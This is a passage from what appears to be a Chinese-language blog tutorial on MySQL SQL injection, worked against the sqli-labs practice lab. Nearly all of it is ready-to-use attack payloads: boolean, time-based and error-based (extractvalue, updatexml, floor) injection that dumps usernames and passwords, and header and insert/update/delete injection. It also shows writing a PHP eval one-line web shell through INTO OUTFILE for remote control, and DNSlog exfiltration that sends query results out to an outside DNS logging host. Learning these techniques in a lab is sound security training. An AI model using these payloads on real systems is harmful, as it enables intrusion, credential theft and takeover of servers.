class="hljs-number">1</span><span class="hljs-operator">=</span>(if((<span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^r&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>));<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">user</span>() regexp<span class="hljs-string">&#x27;^ri&#x27;</span>);<br><br>通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等<br>于 <span class="hljs-number">0</span> 或者 <span class="hljs-number">1</span> 进行判断。<br></code></pre></td></tr></table></figure><p>like 匹配注入</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。<br>用法：<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> ‘ro%’<br></code></pre></td></tr></table></figure><p>总结：布尔盲注即用二分法，通过页面的真假判断数字的大小，推断出对应的字母，进一步拼凑出所有的字符串，从而得出想要获得的信息</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>当页面没有正常回显但是有报错就可使用报错注入</p><p><img src="/../image/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5.png"></p><h4 id="extractValue-报错注入"><a href="#extractValue-报错注入" class="headerlink" title="extractValue()报错注入"></a>extractValue()报错注入</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">函数<span class="hljs-built_in">extractValue</span>()包含两个参数<br>第一个参数 XML文档对象名称，第二个参数 路径<br></code></pre></td></tr></table></figure><p><img src="/../image/extractvalue.png"></p><p>目的：用extractvalue报错回显出我们想要的查询结果</p><p>例子：</p><p>利用extractvalue报错注入 less5</p><p><img src="/../image/extractvalue2.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">使用extractvalue报错注入得到库名<br>?<span class="hljs-attribute">id</span>=100&#x27; union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+<br><br>0x7e即<span class="hljs-string">&#x27;~&#x27;</span>符号<br>在使用extracvalue函数是第一个参数可以任意填入，不影响<br>查表 查列 查内容与查库类似<br><br>查表<br>?<span class="hljs-attribute">id</span>=100&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()))) --+<br><br>查列<br>?<span class="hljs-attribute">id</span>=100&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))) --+<br><br>查数据<br>如果不知道列数也可用 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=xxx<br>?<span class="hljs-attribute">id</span>=100&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=extractvalue(1,concat(0x7e,(select group_concat(username,<span class="hljs-string">&#x27;~&#x27;</span>,password) <span class="hljs-keyword">from</span> users))) --+<br>默认只能返回32个字符串<br></code></pre></td></tr></table></figure><p>查表查数据：</p><p><img src="/../image/extractvalue3.png"></p><p>使用函数substring解决只能返回32个字符串问题</p><p><img src="/../image/extractvalue4.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">substring</span><span class="hljs-params">()</span></span>第一个参数为目标字符串，第二个参数为从哪个位置开始，第三个参数为显示字符数<br>同substr<br></code></pre></td></tr></table></figure><h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h4><p>updatexml函数</p><p><img src="/../image/updatexml.png"></p><p>例子：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=updatexml(1,concat(&#x27;~&#x27;,(select database())),3) --+<br><br>1<span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br><span class="hljs-string">查表名、列名、内容与union注入相似</span><br></code></pre></td></tr></table></figure><p><img src="/../image/updatexml2.png"></p><h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p>涉及到的函数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">rand</span><span class="hljs-params">()</span></span>函数：随机返回<span class="hljs-number">0</span>~<span class="hljs-number">1</span>间的小数<br><br><span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">()</span></span>函数：小数向下取整数。向上取整数 <span class="hljs-built_in">ceiling</span>()<br><br><span class="hljs-function"><span class="hljs-title">concat_ws</span><span class="hljs-params">()</span></span>函数：将括号内数据用第一个字段连接起来<br><br>group by子句：分组语句，常用于，结合统计函数，根据一个或多个列，对结果集进行分组<br><br>as：别名<br><br><span class="hljs-function"><span class="hljs-title">count</span><span class="hljs-params">()</span></span>函数：汇总统计数量<br><br>limit：这里用于显示指定行数<br></code></pre></td></tr></table></figure><p>完整的一段floor报错注入例子：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&#x27; union <span class="hljs-keyword">select</span>,<span class="hljs-built_in">count</span>(*),concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;~&#x27;</span>,id,username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a --+<br></code></pre></td></tr></table></figure><hr><p>floor报错分解：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">rand()<br><span class="hljs-keyword">select</span> rand() <span class="hljs-keyword">from</span> users;根据表users的行数随机显示结果<br><br>floor()<br><span class="hljs-keyword">select</span> floor(rand()*<span class="hljs-number">2</span>);结果随机为<span class="hljs-number">0</span>或者<span class="hljs-number">1</span><br><br>concat_ws()<br><span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),floor(rand()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">from</span> users;将括号内数据用<span class="hljs-string">&#x27;-&#x27;</span>连接起来<br><br><span class="hljs-keyword">as</span>,<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>分组<br><span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),floor(rand()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;<br><br>count()汇总<br><span class="hljs-keyword">select</span> count(*),concat_ws(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),floor(rand()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;<br></code></pre></td></tr></table></figure><p>报错：</p><p><img src="/../image/floor%E6%8A%A5%E9%94%99.png"></p><p>报错原理分析：</p><p><img src="/../image/floor%E6%8A%A5%E9%94%99%E5%88%86%E6%9E%90.png"></p><p>例子：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs q">查看版本号<br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat_ws(&#x27;-&#x27;,(<span class="hljs-keyword">select</span> version()),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)) as x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x --+<br><br><br>如果要查看库名，表名，列名与<span class="hljs-built_in">union</span>注入相似,只需修改加粗位置语句即可<br>比如：<br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat_ws(&#x27;-&#x27;,(<span class="hljs-keyword">select</span> group_concat(username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)) as x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x --+<br><br><br><br>如果使用group_concat()不显示可以使用concat，然后使用limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>控制显示<br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat_ws(&#x27;-&#x27;,(<span class="hljs-keyword">select</span> concat(&#x27;~&#x27;,username,&#x27;:&#x27;,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)) as x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x --+<br><br><br><br>注意：<br><span class="hljs-number">1.</span>information_schema.<span class="hljs-built_in">tables</span>跟查询表名没有关系，使用它只是因为数据需要足够多来产生报错<br><span class="hljs-number">2.</span><span class="hljs-built_in">rand</span>()里面参数填入<span class="hljs-number">0</span>必然会产生报错<br><span class="hljs-number">3.</span>使用as取别名使代码更方便<br></code></pre></td></tr></table></figure><p>注意：floor报错的好处是能显示64位字符，比上面两种报错多显示一倍</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>关键函数：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>()通过<span class="hljs-title"><span class="hljs-built_in">sleep</span></span>()函数往里面添加参数，从而影响网页的响应时间来判断闭合方式，或者判断是否成功注入</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A81.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(<span class="hljs-keyword">condition</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>)<span class="hljs-keyword">condition</span>为条件，<span class="hljs-literal">true</span>当条件为真时返回的值，<span class="hljs-literal">false</span>当条件为假时返回的值<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A82.png"></p><p>查看网页响应时间的长短：</p><p><img src="/../image/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A83.png"></p><p>具体例子：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">时间盲注需要结合布尔盲注ascii相关知识，通过网页响应时间来猜库名每一位的字母<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">0</span>),sleep(<span class="hljs-number">3</span>));<br><br>更改substr参数推算第二个字母，并以此推算出剩余字母，直到得出结果<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">0</span>),sleep(<span class="hljs-number">3</span>));<br><br>替换入需要查询的命令语句<br>查表名<br>?id=1&#x27; and if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">0</span>),sleep(<span class="hljs-number">3</span>))<br><br>查列名，内容方法类似<br></code></pre></td></tr></table></figure><p>可直接and + if语句</p><p><img src="/../image/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A84.png"></p><p>时间盲注的闭合符的判断</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">哪种响应时间符合休眠时间就是哪种闭合<br>?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> sleep(3)--+<br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> sleep(3)--+<br>?<span class="hljs-attribute">id</span>=1&#x27;) <span class="hljs-keyword">and</span> sleep(3)--+<br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> sleep(3)--+<br>?<span class="hljs-attribute">id</span>=1&quot;) <span class="hljs-keyword">and</span> sleep(3)--+<br></code></pre></td></tr></table></figure><h2 id="Sql注入文件上传"><a href="#Sql注入文件上传" class="headerlink" title="Sql注入文件上传"></a>Sql注入文件上传</h2><p>文件上传要点：<br><img src="/../image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A6%81%E7%82%B9.png"></p><ul><li>secure-file-priv的值有三种情况：</li><li>secure_file_prive&#x3D;null —限制mysqld 不允许导入导出</li><li>secure_file_priv&#x3D;&#x2F;path&#x2F; —限制mysqld的导入导出只能发生在默认的&#x2F;path&#x2F;目录下</li><li>secure_file_priv&#x3D;’ ‘ —不对mysqld 的导入 导出做限制</li></ul><p>通过注入点写入木马程序的前提条件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1、mysql开启了<span class="hljs-attribute">secure_file_priv</span>=<span class="hljs-string">&quot;&quot;</span>的配置<br>2、知道了网站代码的真实物理路径<br>3、物理路径具备写入权限<br>4、最好是root用户，这个条件非必须，但是有最好<br></code></pre></td></tr></table></figure><p>获得后台真实物理路径的方法：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-number">1</span>、收集站点敏感目录，比如phpinfo.php探针文件是否可以访问到<br><span class="hljs-number">2</span>、站点网址输入一些不存在的网址或者加一些非法参数数据，让数据报错，看错误信息中是否存在路径信息<br><span class="hljs-number">3</span>、指纹信息收集<br>nginx默认站点目录<span class="hljs-symbol">:/usr/share/nginx/html</span>，配置文件路径<span class="hljs-symbol">:/etc/nginx/nginx</span>.conf<br>apache默认站点目录<span class="hljs-symbol">:/var/www/html</span><br><span class="hljs-number">4</span>、通过站点其他漏洞来获取配置信息、真实物理路径信息，比如如果发现远程命令执行漏洞，针对php的站点，直接执行一个phpinfo()函数，可以看到phpinfo.php所展示的各种信息。<br><span class="hljs-number">5</span>、其他思路，反正就是不断地尝试<br></code></pre></td></tr></table></figure><p>文件上传指令：</p><p><img src="/../image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%8C%87%E4%BB%A4.png"></p><p>内置相关函数</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less">@<span class="hljs-variable">@basedir</span><span class="hljs-variable">@@basedir</span>在MySQL中表示MySQL的安装路径,通过执行SQL命令SELECT <span class="hljs-variable">@@basedir</span>;，可以获取<span class="hljs-selector-tag">MySQL</span>的安装路径<br><br>@@<span class="hljs-selector-tag">datadir</span>  构造<span class="hljs-selector-tag">SQL</span>语句：<span class="hljs-selector-tag">select</span> @@<span class="hljs-selector-tag">datadir</span>,作用：返回数据的存储目录<br></code></pre></td></tr></table></figure><p>注意：into outfile后的路径必须使用双反斜杠\\分隔</p><hr><p>成功上传一句话木马后可用蚁剑连接</p><p>例如sqli第七关</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1&#x27;)) union select 1,2,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mixbp&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; into outfile &quot;E:\\CTF\\phpstudy\\phpstudy_pro\\WWW\\pwd.php&quot; --+</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01.png"></p><p>添加成功</p><p>连接之后就相当于控制这台电脑了</p><p><img src="/../image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02.png"></p><h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><p>要求：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">secure_file_priv=<span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-comment">---不对mysqld 的导入 导出做限制</span><br>数据库读取权限<br></code></pre></td></tr></table></figure><p>常用函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">load_file</span><span class="hljs-params">(<span class="hljs-string">&quot;文件路径&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,load_file(<span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>phpStudy<span class="hljs-subst">\\</span>PHPTutorial<span class="hljs-subst">\\</span>WWW<span class="hljs-subst">\\</span>xx.txt&quot;</span>)#<br><br>注意：load_file函数里的文件路径分隔要用\\<br>用联合查询时注意列数和前面相同<br></code></pre></td></tr></table></figure><h3 id="增删改查注入"><a href="#增删改查注入" class="headerlink" title="增删改查注入"></a>增删改查注入</h3><p>其实就是通过抓包后使用报错注入，这里就略过了</p><p><strong>增加</strong></p><p>1.Insert</p><p>简单举例</p><p>insert into users values(‘16’,’lcamry’,’lcamry’);</p><p><strong>删除</strong></p><p>2.删数据:</p><p>delete from 表名;</p><p>delete from 表名 where id&#x3D;1; </p><p>删除结构：</p><p>删数据库：drop database 数据库名;</p><p>删除表：drop table 表名;</p><p>删除表中的列:alter table 表名 drop column 列名;</p><p>简单举例：</p><p>delete from users where id&#x3D;16</p><p><strong>修改</strong></p><p>修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ; </p><p>带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6;</p><p>update users set username&#x3D;’tt’ where id&#x3D;15</p><p>爆库</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> database())),<span class="hljs-number">3</span>) <span class="hljs-keyword">or</span>&#x27;<br></code></pre></td></tr></table></figure><p>update&#x2F;insert注入</p><p><img src="/../image/%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%B3%A8%E5%85%A5.png"></p><p>爆表，内容操作相似</p><p>delete注入</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">or updatexml(<span class="hljs-number">2</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">database</span>())),<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p><img src="/../image/delete%E6%B3%A8%E5%85%A5.png"></p><p>注意：在注入后必须把特殊符号转换成url形式</p><h3 id="http请求头注入"><a href="#http请求头注入" class="headerlink" title="http请求头注入"></a>http请求头注入</h3><p>其实就是抓包后在请求头中插入报错注入</p><p>php专门取请求头数据，使用的方法是$_SERVER[“请求头键”]就能拿到值</p><p><img src="/../image/%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%A8%E5%85%A5.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">源码例子<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-string">&#x27;security&#x27;</span>.<span class="hljs-string">&#x27;uagents&#x27;</span> (<span class="hljs-string">&#x27;uagent&#x27;</span>,<span class="hljs-string">&#x27;ip_address&#x27;</span>,<span class="hljs-string">&#x27;username&#x27;</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;$uagent&#x27;</span>,<span class="hljs-string">&#x27;$IP&#x27;</span>,$uname);<br><br>第一种方法<br><span class="hljs-string">&#x27;or updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select database())),3) or&#x27;</span><br>注入关键<br>(<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())),<span class="hljs-number">3</span>) <span class="hljs-keyword">or</span><span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$IP,&#x27;</span>$unam<span class="hljs-string">e&#x27;)</span><br><span class="hljs-string">另一种方法</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())),<span class="hljs-number">3</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)#也可<br></code></pre></td></tr></table></figure><p>只要服务端取出了相应的请求头数据和数据库有联系就可以注入</p><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>load_file()函数读取指定路径文件</p><p>例如：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">load_file</span>(<span class="hljs-params"><span class="hljs-string">&quot;C:\\benben.txt&quot;</span></span>)</span>;<br>不仅可以读取本机也可以读取网络上的文件<br></code></pre></td></tr></table></figure><p>UNC路径</p><p>‌**<a href="https://www.baidu.com/s?wd=UNC%E8%B7%AF%E5%BE%84&usm=3&ie=utf-8&rsv_pq=d0bbe5b701514305&oq=UNC%E8%B7%AF%E5%BE%84&rsv_t=0606yqX9OxjLQIUiIKkd8siq5VQfZtUoG9/OBbU9/PbY2EZS8yZgpvDFpLw&rsv_dl=re_dqa_generate&sa=re_dqa_generate">UNC路径</a>（Universal Naming Convention）是一种在<a href="https://www.baidu.com/s?wd=Windows%E7%BD%91%E7%BB%9C&usm=3&ie=utf-8&rsv_pq=d0bbe5b701514305&oq=UNC%E8%B7%AF%E5%BE%84&rsv_t=26750xLLRlhGqSL0u8cn7DxfItDAmPP2W20SDOgOFhZZP7sLRYOaFJ4R3wo&rsv_dl=re_dqa_generate&sa=re_dqa_generate">Windows网络</a>中表示共享文件和资源的标准化方法**‌。UNC路径通常以两个反斜杠（\）开头，后面跟着服务器名称和共享资源名称。例如，一个典型的UNC路径格式为<code>\\ServerName\ShareName\File.txt</code>，其中<code>ServerName</code>是服务器名称，<code>ShareName</code>是共享资源的名称，<code>File.txt</code>是文件名称。‌</p><p>例如：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">load_file</span>(<span class="hljs-params"><span class="hljs-string">&quot;//192.168.1.209/123/benben.txt&quot;</span></span>)</span>;<br></code></pre></td></tr></table></figure><p>servername可以是域名也可以是ip，常用的就是域名</p><p>需要用到的网站：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//ceye.io</span><br>常用：http:<span class="hljs-comment">//www.dnslog.cn/</span><br></code></pre></td></tr></table></figure><p>手动注入：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">获得库名<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> load_file(concat(&quot;//&quot;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),&quot;.域名/任意文件&quot;))) <span class="hljs-comment">--+</span><br><br>获得表名<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> load_file(concat(&quot;//&quot;,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&quot;.域名/任意文件&quot;))) <span class="hljs-comment">--+</span><br>使用<span class="hljs-keyword">limit</span>控制显示<br><br>获得列名<br><span class="hljs-keyword">and</span> (<span 